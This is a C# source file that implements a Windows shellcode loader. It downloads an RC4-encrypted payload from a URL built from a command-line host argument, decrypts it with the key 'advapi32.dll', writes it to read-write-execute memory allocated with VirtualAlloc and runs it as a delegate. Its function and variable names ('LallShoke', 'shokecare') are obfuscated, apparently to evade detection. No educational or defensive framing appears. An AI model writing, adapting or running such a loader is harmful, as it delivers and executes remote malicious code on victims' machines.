using System;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Threading;

class Program
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint MEM_RELEASE = 0x8000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static void Main(string[] args)
    {
        if (args.Length == 0)
        {
            Console.WriteLine("[+] No arguments provided.");
            return;
        }

        string url = $"http://{args[0]}.bin.enc";
        LallShoke(url);
        
    }

    static void LallShoke(string url)
    {
        byte[] encryptedShokecare = LallRemoteShoke(url);
        if (encryptedShokecare == null || encryptedShokecare.Length == 0)
        {
            Console.Error.WriteLine("Failed to load shellcode from URL.");
            return;
        }

        string key = "advapi32.dll";
        byte[] shokecare = RC4Decrypt(encryptedShokecare, key);

        IntPtr exec = VirtualAlloc(IntPtr.Zero, (uint)shokecare.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (exec == IntPtr.Zero)
        {
            Console.Error.WriteLine("Failed to allocate executable memory.");
            return;
        }

        Marshal.Copy(shokecare, 0, exec, shokecare.Length);

        Action func = Marshal.GetDelegateForFunctionPointer<Action>(exec);
        func();

        VirtualFree(exec, 0, MEM_RELEASE);
    }

    static byte[] LallRemoteShoke(string url)
    {
        using (WebClient client = new WebClient())
        {
            try
            {
                return client.DownloadData(url);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("Failed to connect to URL: " + ex.Message);
                return null;
            }
        }
    }

    static byte[] RC4Decrypt(byte[] data, string key)
    {
        byte[] s = new byte[256];
        for (int i = 0; i < 256; i++)
            s[i] = (byte)i;

        int j = 0;
        for (int i = 0; i < 256; i++)
        {
            j = (j + s[i] + key[i % key.Length]) % 256;
            Swap(s, i, j);
        }

        byte[] decrypted = new byte[data.Length];
        int x = 0, y = 0;
        for (int n = 0; n < data.Length; n++)
        {
            x = (x + 1) % 256;
            y = (y + s[x]) % 256;
            Swap(s, x, y);
            decrypted[n] = (byte)(data[n] ^ s[(s[x] + s[y]) % 256]);
        }
        return decrypted;
    }

    static void Swap(byte[] array, int index1, int index2)
    {
        byte temp = array[index1];
        array[index1] = array[index2];
        array[index2] = temp;
    }
}
